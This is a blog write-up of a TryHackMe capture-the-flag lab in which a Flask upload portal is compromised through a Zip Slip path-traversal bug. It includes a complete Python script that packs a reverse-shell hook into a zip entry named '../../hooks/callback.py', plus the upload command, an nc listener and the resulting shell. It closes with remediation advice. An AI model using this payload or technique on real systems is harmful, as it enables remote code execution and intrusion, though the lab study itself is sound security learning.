---
layout: post
title: "THM: The Hollow Shell"
date: 2026-08-05 21:00:00
category: "Web Exploitation"
difficulty: "Medium"
tags: [thm, hacker-holidays, web, file-upload, zip-slip, path-traversal, flask, rce, reverse-shell]
excerpt: "A Flask app that lets you upload a zip 'shell' with a manifest listing its assets. The upload filter carefully checks each asset's file extension, and completely forgets to check the path. That one mismatch is a Zip Slip: smuggle a traversal path into the archive, drop a Python hook where a background worker runs it, and the shell answers with a shell of your own. This one took me forever, and most of that was learning to trust the bug."
---

<figure class="figure-narrow">
  <img src="{{ '/assets/img/hollow-shell-briefing.png' | relative_url }}" alt="TryHackMe room page: Concierge Briefing for The Hollow Shell. Category Web, difficulty Medium, 90 points. You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear. The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell, a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is held to the room's ear it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own. Itinerary: find the flag.">
  <figcaption>The briefing for The Hollow Shell. "Slip past what the portal forgets to check, and the shell answers with a shell of your own" is the whole box: the upload validation has a gap, and the payoff is a shell (code execution). "Slip" is a nod at archive path handling, which is exactly where the gap turned out to be.</figcaption>
</figure>

I'll be honest, this one took me forever, and most of that time was not spent finding the
bug. It was spent not trusting it. I kept seeing the gap, assuming it couldn't be that
simple, and going to look for something cleverer. There wasn't anything cleverer. So this
writeup is partly about the technique and partly about learning to believe a validator when
it tells you what it does and does not check.

It's a TryHackMe Web Medium from the Hacker Holidays event, the Byte Lotus universe again,
this time a beachfront "Shoreline Display" portal built in Flask, running on port 5000.
Standard disclaimer, it's a deliberately vulnerable lab, nothing here is a real service.

*One note before you read on. There's a single grey bar like <span class="spoiler">this</span>
covering the one detail that turns the bug into the exploit. I set the whole thing up in the
open first so you can try to work it out before you peek. Click it (or tab to it and press
Enter) to reveal. Hints, not answers off the rip.*

## Getting in

The login was the easy part, embarrassingly so. The credentials were sitting right there on
the login page itself, so there was no attacking to do, I just read them and signed in as
`concierge`. Read the page before you attack it, a lesson I apparently have to relearn every
single box.

Once I was in, I did notice the session cookie was base64, so of course I decoded it. It
just gave me back the account I was already logged in as. That's a genuine dead end worth
mentioning, because I spent a little while poking at it: there was no second account to
impersonate, and a Flask session cookie is signed anyway, so even though you can read it you
can't tamper with it without the app's secret key. The cookie was not the way in. I noted it
and moved on.

## The feature: upload a shell

<figure>
  <img src="{{ '/assets/img/hollow-shell-dashboard.png' | relative_url }}" alt="The Shoreline Display dashboard. Heading 'Room Service / Shoreline Display', logged in as concierge. A banner reads 'Shell is missing shell.json.' A 'Bring a shell ashore' panel invites you to upload a shell as a .zip souvenir pack to set the ambiance on in-room tablets, noting each shell must contain a shell.json manifest listing its assets. A file picker labelled SHELL (.ZIP) and a button 'HOLD IT TO THE ROOM'S EAR'. Small print says a shell may include optional automation hooks that the theme worker applies shortly after the shell comes ashore, and lists allowed asset types: png jpg gif svg css json. A 'Shells on display' panel says 'No shells on display yet.'">
  <figcaption>The dashboard. You upload a .zip "shell" containing a shell.json manifest that lists its assets, the allowed asset types are png/jpg/gif/svg/css/json, and crucially a shell can include "automation hooks" that a background "theme worker" applies for you shortly after upload. Hold that last detail, it's the whole ending.</figcaption>
</figure>

The dashboard wants a `.zip` "shell" containing a `shell.json` manifest listing its assets.
Allowed asset types are printed right on the page: `png jpg gif svg css json`. And there's a
line that turns out to matter enormously: a shell may include optional **automation hooks**
that a background **theme worker** applies for you shortly after the shell comes ashore. So
something server-side runs after upload. Keep that in your pocket.

The upload posts to `/upload` as `multipart/form-data`, which I confirmed in DevTools. From
the terminal, with my logged-in session saved to a cookie jar, the shape of every test was:

```bash
curl -v --max-time 15 -b ~/cookies.txt -F "shell=@test.zip" http://<TARGET_IP>:5000/upload
```

## Mapping the manifest schema by reading the errors

The manifest format wasn't documented anywhere, so I reverse-engineered it the lazy way, by
submitting something broken and letting the validator tell me what it wanted. This is a
genuinely useful beginner move: a strict validator will teach you its schema for free if you
just keep reading its complaints.

- An empty or partial manifest gave: *"Shell rejected: shell.json is missing a 'name'."*
- At one point I accidentally had two JSON objects in the file and got *"shell.json could not
  be parsed."* (Lesson learned: one JSON object per file, and validate locally with
  `python3 -m json.tool shell.json` before wasting an upload.)
- Add the `name`, add an `assets` list, and it went through.

The minimal manifest that got accepted:

```json
{"name": "test", "assets": ["style.css"]}
```

On a successful upload the app said the shell was "brought ashore" and stored at
`shells/<random-id>/`, and I confirmed two things that matter. First, the extracted files
are served straight back over the web: `GET /shells/<id>/style.css` returned my file's
contents (`hi`) verbatim. So I control file **content**, and those files live in a
**web-served directory** at a path I know. Second, and this is where it got interesting, I
started probing how it validated the asset paths.

## The gap: it checks the extension, not the path

I put a path-traversal string into the manifest's asset list to see what it would say:

```json
{"name": "test", "assets": ["../../etc/hostname"]}
```

The rejection was the single most important line in the whole box:

```
Shell rejected: asset type not allowed: ../../etc/hostname
```

Read that carefully. It rejected my asset because of its **type**, its file extension. It
said nothing at all about the `../../` traversal. The only gate on the manifest is the
extension allow-list. The path itself is never validated. **The portal checks the extension
but forgets to check the path**, which is precisely what the briefing meant by "slip past
what the portal forgets to check."

That gave me two things to chew on. One, the manifest only ever validates the *declared*
assets. Two, a zip is a bag of files, and the archive's own entry names are attacker
controlled. If the extraction step writes out archive entries by their stored names without
checking them, then a file that isn't even listed in the manifest, or a name that contains
`../`, would never meet the extension check at all. It would just get written wherever its
name points. That is the classic archive-extraction bug called **Zip Slip**, and combined
with "served files" and, better, that background theme worker running hooks, it's a straight
line to code execution.

So what exactly do you smuggle in? The answer is a zip entry whose *name* is a traversal
path pointing at somewhere useful:

<span class="spoiler"><code>a zip whose manifest is valid, plus an unlisted entry named ../../hooks/callback.py that Zip Slip drops into the hooks directory the theme worker executes</code></span>

## Getting a shell

Here's the mechanism spelled out, because "a file on disk" and "code that runs" are not the
same thing, and this box bridges them for you. The dashboard told us a theme worker
automatically runs "automation hooks" after upload. If I can use Zip Slip to write a Python
file into wherever those hooks live, the worker will execute it for me. So the payload is a
zip that contains a perfectly valid `shell.json` (so the upload is accepted) plus one extra
entry whose name climbs out of `shells/<id>/` and lands a `.py` reverse shell in the `hooks`
directory.

Now, an honesty note the room deserves. I first got there my own way: I grabbed a Python
reverse-shell payload off [revshells.com](https://www.revshells.com/) and hand-assembled the
malicious zip, and it did work. But while I was flailing I found
[djalilayed's script for this room](https://github.com/djalilayed/tryhackme/tree/main/the_hollow_shell),
and it's honestly a much cleaner, better put-together version of exactly what I was doing by
hand, so that's what I'll show here. Credit where it's due. It builds the whole thing in one
go:

```python
import json
import zipfile

LHOST = "<TUN0_IP>"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

Look at what it does. The manifest is valid but lists **no** assets, so the extension
allow-list has nothing to complain about. The dangerous part rides in as a second archive
entry, `../../hooks/callback.py`, which the manifest never mentions and the extension check
never sees. When the app extracts the zip, that entry's name walks up out of the shell's
storage folder and writes the file into the `hooks` directory. The callback itself is a
standard Python reverse shell: open a socket back to me, wire it to stdin/stdout/stderr, and
spawn a `bash` with a pty so it's interactive.

Build it, start a listener, and upload it exactly like every test before:

```bash
python3 build_shell.py

nc -lvnp 4444

curl -v --max-time 15 -b ~/cookies.txt -F "shell=@reverse-shell.zip" http://<TARGET_IP>:5000/upload
```

A few seconds after the upload, the theme worker did its job and ran my hook:

```
Listening on 0.0.0.0 4444
Connection received on <TARGET_IP> 51512
roomservice@tryhackme-2404:/var/www/conch$
```

A shell as `roomservice`, sitting in the app's own directory `/var/www/conch` (with `app.py`
and `theme_worker.py` right there, which was nice for confirming afterwards how the hooks get
run). From here the itinerary was one line. I moved to the user's home and there was the
flag:

```bash
cd ~
cat flag.txt
# THM{[redacted]}
```

Redacted as always. The path is the point, and the path was: a filter that checked the
extension but not the path, an extractor that trusted archive entry names, and a worker
politely running whatever landed in its hooks folder.

## How to actually fix this box

Every piece of this maps to a real, common upload flaw:

- **Never trust archive entry names.** Before writing any extracted file, resolve its final
  path and confirm it stays inside the intended directory. Reject any entry whose resolved
  path escapes the target folder. That one check kills Zip Slip.
- **Validate what you extract, not just what's declared.** Checking the manifest's listed
  assets while blindly writing every archive entry is the whole gap. Validate every file that
  actually lands on disk, by path and by type.
- **Extension is not type, and it's certainly not path.** A `.css` name proves nothing, and
  it says nothing about where the file goes. Check the destination path separately.
- **Don't auto-execute uploaded content.** A background worker running files out of a
  directory that user uploads can reach is the difference between "annoying file write" and
  "remote code execution."

## What I took away

- **Believe the validator.** The error message literally told me it only checked the
  extension. I wasted the most time not on finding that, but on refusing to accept it was the
  whole bug. If a filter tells you what it checks, it's also telling you what it doesn't.
- **Error messages are a free schema.** I mapped an undocumented manifest format just by
  reading rejections and iterating. Submit, read the complaint, fix that one thing, repeat.
- **Zip Slip is "checks the extension, not the path."** Archive entry names are attacker
  input. If extraction writes them out unchecked, a `../` in a name is a file-write anywhere.
- **Served is not executed, until something executes it.** The files being web-served wasn't
  code execution. The theme worker running hooks was. Find the thing that runs your file.
- **It's fine to use someone else's cleaner tooling.** My hand-built version worked, but
  djalilayed's script was a tidier way to do the same thing, and reading it taught me a
  neater way to assemble the payload.

> Room: The Hollow Shell on TryHackMe (Hacker Holidays 2026), Web, Medium, 90 points. Flag
> left out as always. A textbook Zip Slip dressed up as a souvenir shell, and a good reminder
> that the hardest part of an easy bug can be trusting that it's real.
